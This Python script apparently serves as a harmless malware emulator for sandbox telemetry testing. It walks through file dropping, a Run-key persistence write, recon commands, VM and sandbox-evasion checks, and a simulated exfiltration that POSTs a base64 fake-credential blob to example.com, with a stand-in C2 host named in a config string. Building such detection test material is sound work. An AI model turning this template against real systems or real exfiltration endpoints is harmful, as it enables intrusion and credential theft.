"""IsoLens Malware Emulator – Academic Behavioral Testing Sample.

A harmless script that mimics common malware behaviors so that sandbox
monitoring tools (Sysmon, Procmon, tcpvcon, handle, etc.) can capture
realistic telemetry.  Runs on Windows 10 with only the Python stdlib.

Simulated behaviors
───────────────────
1. File system   – drop files in temp, read sensitive paths, create hidden file
2. Registry      – write & read a Run key (persistence), then clean up
3. Network       – DNS lookup + HTTP GET to example.com
4. Processes     – spawn cmd, powershell, whoami, ipconfig, netstat
5. Evasion hints – enumerate running processes, check for VM artifacts
6. Exfil hint    – base64-encode a fake credential blob and write it out

Every action is logged to stdout **and** to a log file so the controller
can collect it later.
"""

from __future__ import annotations

import base64
import ctypes
import datetime
import json
import logging
import os
import platform
import socket
import subprocess
import sys
import tempfile
import time
import urllib.request

# ── Logging setup ──────────────────────────────────────────────────────────
LOG_DIR = os.path.join(tempfile.gettempdir(), "isolens_emulator")
os.makedirs(LOG_DIR, exist_ok=True)
LOG_FILE = os.path.join(LOG_DIR, "emulator_log.txt")

logging.basicConfig(
    level=logging.INFO,
    format="[%(asctime)s] %(levelname)-7s %(message)s",
    handlers=[
        logging.StreamHandler(sys.stdout),
        logging.FileHandler(LOG_FILE, mode="w", encoding="utf-8"),
    ],
)
log = logging.getLogger("malware_emulator")

RESULTS: dict[str, dict] = {}


def record(category: str, action: str, detail: str, success: bool = True):
    """Store an action result for the final JSON summary."""
    RESULTS.setdefault(category, []).append({
        "action": action,
        "detail": detail,
        "success": success,
        "timestamp": datetime.datetime.now().isoformat(),
    })
    level = logging.INFO if success else logging.WARNING
    log.log(level, "[%s] %s — %s", category, action, detail)


# ═══════════════════════════════════════════════════════════════════════════
# 1. FILE SYSTEM OPERATIONS
# ═══════════════════════════════════════════════════════════════════════════

def phase_filesystem():
    log.info("═══ PHASE 1: File System Operations ═══")

    # 1a – Drop a payload stub in %TEMP%
    payload_path = os.path.join(LOG_DIR, "dropped_payload.bin")
    try:
        with open(payload_path, "wb") as f:
            f.write(b"\x4d\x5a" + os.urandom(256))  # MZ header + junk
        record("filesystem", "drop_payload", f"Wrote fake PE to {payload_path}")
    except Exception as e:
        record("filesystem", "drop_payload", str(e), success=False)

    # 1b – Create a hidden file (Windows attrib)
    hidden_path = os.path.join(LOG_DIR, ".hidden_config.dat")
    try:
        with open(hidden_path, "w") as f:
            f.write("c2_server=evil.example.com\ninterval=30\n")
        if platform.system() == "Windows":
            subprocess.run(["attrib", "+H", hidden_path],
                           capture_output=True, timeout=5)
        record("filesystem", "create_hidden_file", f"Hidden file at {hidden_path}")
    except Exception as e:
        record("filesystem", "create_hidden_file", str(e), success=False)

    # 1c – Read sensitive-looking paths (best effort)
    sensitive_paths = [
        os.path.expandvars(r"%USERPROFILE%\Desktop"),
        os.path.expandvars(r"%APPDATA%\Microsoft\Windows\Recent"),
        os.path.expandvars(r"%SYSTEMROOT%\System32\config"),
        os.path.expandvars(r"%USERPROFILE%\Documents"),
    ]
    for p in sensitive_paths:
        try:
            entries = os.listdir(p)
            record("filesystem", "read_sensitive_dir",
                   f"{p} → {len(entries)} entries")
        except Exception as e:
            record("filesystem", "read_sensitive_dir",
                   f"{p} → {e}", success=False)

    # 1d – Write a batch dropper script
    bat_path = os.path.join(LOG_DIR, "update_service.bat")
    try:
        with open(bat_path, "w") as f:
            f.write("@echo off\r\n")
            f.write("echo Emulated dropper running\r\n")
            f.write("whoami\r\n")
            f.write("ipconfig /all\r\n")
        record("filesystem", "write_batch_dropper", f"Batch at {bat_path}")
    except Exception as e:
        record("filesystem", "write_batch_dropper", str(e), success=False)

    # 1e – Create a directory tree mimicking staging area
    staging = os.path.join(LOG_DIR, "staging", "exfil")
    try:
        os.makedirs(staging, exist_ok=True)
        for i in range(3):
            fpath = os.path.join(staging, f"chunk_{i:03d}.enc")
            with open(fpath, "wb") as f:
                f.write(os.urandom(512))
        record("filesystem", "create_staging_dir",
               f"Staging area at {staging} with 3 encrypted chunks")
    except Exception as e:
        record("filesystem", "create_staging_dir", str(e), success=False)


# ═══════════════════════════════════════════════════════════════════════════
# 2. REGISTRY OPERATIONS (Windows only)
# ═══════════════════════════════════════════════════════════════════════════

def phase_registry():
    log.info("═══ PHASE 2: Registry Operations ═══")

    if platform.system() != "Windows":
        record("registry", "skip", "Not Windows — skipping")
        return

    import winreg

    key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
    value_name = "IsoLensEmulatorTest"
    value_data = r"C:\IsoLens\tools\emulator_persistence.exe"

    # 2a – Write a Run key (persistence)
    try:
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path,
                            0, winreg.KEY_SET_VALUE) as key:
            winreg.SetValueEx(key, value_name, 0, winreg.REG_SZ, value_data)
        record("registry", "write_run_key",
               f"HKCU\\{key_path}\\{value_name} = {value_data}")
    except Exception as e:
        record("registry", "write_run_key", str(e), success=False)

    # 2b – Read back the key
    try:
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path,
                            0, winreg.KEY_READ) as key:
            val, _ = winreg.QueryValueEx(key, value_name)
        record("registry", "read_run_key", f"Read back: {val}")
    except Exception as e:
        record("registry", "read_run_key", str(e), success=False)

    # 2c – Clean up — delete the key we just created
    try:
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path,
                            0, winreg.KEY_SET_VALUE) as key:
            winreg.DeleteValue(key, value_name)
        record("registry", "cleanup_run_key", "Deleted emulator Run key")
    except Exception as e:
        record("registry", "cleanup_run_key", str(e), success=False)


# ═══════════════════════════════════════════════════════════════════════════
# 3. NETWORK OPERATIONS
# ═══════════════════════════════════════════════════════════════════════════

def phase_network():
    log.info("═══ PHASE 3: Network Operations ═══")

    # 3a – DNS resolution
    targets = ["example.com", "example.org", "dns.google"]
    for host in targets:
        try:
            ip = socket.gethostbyname(host)
            record("network", "dns_resolve", f"{host} → {ip}")
        except Exception as e:
            record("network", "dns_resolve", f"{host} → {e}", success=False)

    # 3b – HTTP GET (simulated C2 beacon)
    urls = [
        "http://example.com",
        "http://example.org",
    ]
    for url in urls:
        try:
            req = urllib.request.Request(url, headers={
                "User-Agent": "IsoLens-Emulator/1.0 (Sandbox Test)"
            })
            with urllib.request.urlopen(req, timeout=10) as resp:
                data = resp.read(1024)
                record("network", "http_get",
                       f"{url} → HTTP {resp.status}, {len(data)} bytes")
        except Exception as e:
            record("network", "http_get", f"{url} → {e}", success=False)

    # 3c – Open a socket (simulated reverse shell connect attempt — safe target)
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect(("example.com", 80))
        sock.sendall(b"GET / HTTP/1.0\r\nHost: example.com\r\n\r\n")
        resp_data = sock.recv(512)
        sock.close()
        record("network", "raw_socket",
               f"Raw TCP to example.com:80 → {len(resp_data)} bytes received")
    except Exception as e:
        record("network", "raw_socket", str(e), success=False)


# ═══════════════════════════════════════════════════════════════════════════
# 4. PROCESS SPAWNING
# ═══════════════════════════════════════════════════════════════════════════

def _run(cmd: list[str], label: str):
    """Helper: run a command and record the result."""
    try:
        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=15)
        out = (proc.stdout.strip() or proc.stderr.strip())[:300]
        record("process", label, f"PID — exit {proc.returncode}: {out}")
    except Exception as e:
        record("process", label, str(e), success=False)


def phase_processes():
    log.info("═══ PHASE 4: Process Spawning ═══")

    # 4a – System recon commands (what malware typically runs first)
    _run(["whoami"], "whoami")
    _run(["hostname"], "hostname")
    _run(["ipconfig", "/all"], "ipconfig_all")
    _run(["netstat", "-ano"], "netstat_ano")
    _run(["systeminfo"], "systeminfo")
    _run(["tasklist"], "tasklist")

    # 4b – PowerShell execution (a huge red flag in real monitoring)
    _run(["powershell", "-NoProfile", "-Command",
          "Get-Process | Select-Object -First 10 | Format-Table Name,Id,CPU"],
         "powershell_get_process")

    _run(["powershell", "-NoProfile", "-Command",
          "[System.Environment]::OSVersion | Format-List"],
         "powershell_os_version")

    # 4c – cmd /c chain
    _run(["cmd", "/c", "echo %USERNAME% on %COMPUTERNAME% at %DATE% %TIME%"],
         "cmd_env_dump")

    # 4d – Execute the batch dropper we created earlier
    bat_path = os.path.join(LOG_DIR, "update_service.bat")
    if os.path.isfile(bat_path):
        _run(["cmd", "/c", bat_path], "execute_batch_dropper")

    # 4e – Attempt to start a scheduled task (will likely fail — that's fine)
    _run(["schtasks", "/query", "/tn", "\\Microsoft\\Windows\\Maintenance\\"],
         "schtasks_query")


# ═══════════════════════════════════════════════════════════════════════════
# 5. EVASION / ENVIRONMENT FINGERPRINTING
# ═══════════════════════════════════════════════════════════════════════════

def phase_evasion():
    log.info("═══ PHASE 5: Evasion & Environment Fingerprinting ═══")

    # 5a – Check for VM artifacts
    vm_indicators = [
        r"C:\Windows\System32\VBoxService.exe",
        r"C:\Windows\System32\VBoxTray.exe",
        r"C:\Windows\System32\vmtoolsd.exe",
        r"C:\Windows\System32\drivers\vboxguest.sys",
    ]
    found = []
    for path in vm_indicators:
        exists = os.path.isfile(path)
        found.append(path) if exists else None
        record("evasion", "vm_artifact_check",
               f"{path} → {'FOUND' if exists else 'not found'}")

    if found:
        record("evasion", "vm_detected",
               f"VM environment detected via {len(found)} artifacts")

    # 5b – Check computer name for sandbox keywords
    hostname = platform.node().lower()
    sandbox_names = ["sandbox", "malware", "virus", "analysis", "cuckoo"]
    for kw in sandbox_names:
        if kw in hostname:
            record("evasion", "hostname_check",
                   f"Suspicious keyword '{kw}' in hostname '{hostname}'")
            break
    else:
        record("evasion", "hostname_check",
               f"Hostname '{hostname}' — no sandbox keywords detected")

    # 5c – Check uptime (malware often waits if uptime is < 10 min)
    try:
        uptime_ms = ctypes.windll.kernel32.GetTickCount64()
        uptime_min = uptime_ms / 60000
        record("evasion", "uptime_check",
               f"System uptime: {uptime_min:.1f} minutes")
    except Exception:
        record("evasion", "uptime_check", "Could not determine uptime")

    # 5d – Count running processes
    try:
        proc = subprocess.run(["tasklist"], capture_output=True, text=True,
                              timeout=10)
        count = len(proc.stdout.strip().splitlines()) - 3  # header rows
        record("evasion", "process_count",
               f"{count} running processes (low count may indicate sandbox)")
    except Exception as e:
        record("evasion", "process_count", str(e), success=False)


# ═══════════════════════════════════════════════════════════════════════════
# 6. DATA EXFILTRATION SIMULATION
# ═══════════════════════════════════════════════════════════════════════════

def phase_exfiltration():
    log.info("═══ PHASE 6: Data Exfiltration Simulation ═══")

    # 6a – Create a fake credential blob
    fake_creds = {
        "browser": "IsoLensTestBrowser",
        "entries": [
            {"url": "https://bank.example.com", "user": "victim",
             "pass": "P@ssw0rd123!"},
            {"url": "https://mail.example.com", "user": "target",
             "pass": "S3cr3t!!"},
        ],
    }

    # 6b – Base64-encode it (like real stealers do)
    blob = base64.b64encode(
        json.dumps(fake_creds).encode()
    ).decode()

    exfil_path = os.path.join(LOG_DIR, "staging", "exfil", "creds.b64")
    try:
        os.makedirs(os.path.dirname(exfil_path), exist_ok=True)
        with open(exfil_path, "w") as f:
            f.write(blob)
        record("exfiltration", "encode_credentials",
               f"Base64 credential blob written to {exfil_path} "
               f"({len(blob)} chars)")
    except Exception as e:
        record("exfiltration", "encode_credentials", str(e), success=False)

    # 6c – "Exfiltrate" via HTTP POST to example.com (safe, will just 405)
    try:
        req = urllib.request.Request(
            "http://example.com",
            data=blob[:256].encode(),
            headers={
                "User-Agent": "IsoLens-Emulator/1.0",
                "Content-Type": "application/octet-stream",
            },
            method="POST",
        )
        with urllib.request.urlopen(req, timeout=10) as resp:
            record("exfiltration", "http_exfil",
                   f"POST to example.com → HTTP {resp.status}")
    except urllib.error.HTTPError as e:
        record("exfiltration", "http_exfil",
               f"POST to example.com → HTTP {e.code} (expected rejection)")
    except Exception as e:
        record("exfiltration", "http_exfil", str(e), success=False)


# ═══════════════════════════════════════════════════════════════════════════
# MAIN
# ═══════════════════════════════════════════════════════════════════════════

def main():
    log.info("╔══════════════════════════════════════════════════════╗")
    log.info("║   IsoLens Malware Emulator — Academic Use Only      ║")
    log.info("║   This script is HARMLESS. It simulates behaviors   ║")
    log.info("║   so sandbox monitoring tools can capture events.   ║")
    log.info("╚══════════════════════════════════════════════════════╝")
    log.info("PID: %d | User: %s | Host: %s",
             os.getpid(), os.environ.get("USERNAME", "?"), platform.node())
    log.info("Log dir: %s", LOG_DIR)
    log.info("")

    start = time.time()

    phase_filesystem()
    phase_registry()
    phase_network()
    phase_processes()
    phase_evasion()
    phase_exfiltration()

    elapsed = time.time() - start
    log.info("")
    log.info("═══ COMPLETED in %.1f seconds ═══", elapsed)

    # Write structured JSON summary
    summary_path = os.path.join(LOG_DIR, "emulator_results.json")
    with open(summary_path, "w", encoding="utf-8") as f:
        json.dump(RESULTS, f, indent=2)
    log.info("JSON summary → %s", summary_path)
    log.info("Text log     → %s", LOG_FILE)

    # Print the JSON summary to stdout as well
    print("\n" + "=" * 60)
    print("STRUCTURED RESULTS (JSON)")
    print("=" * 60)
    print(json.dumps(RESULTS, indent=2))

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
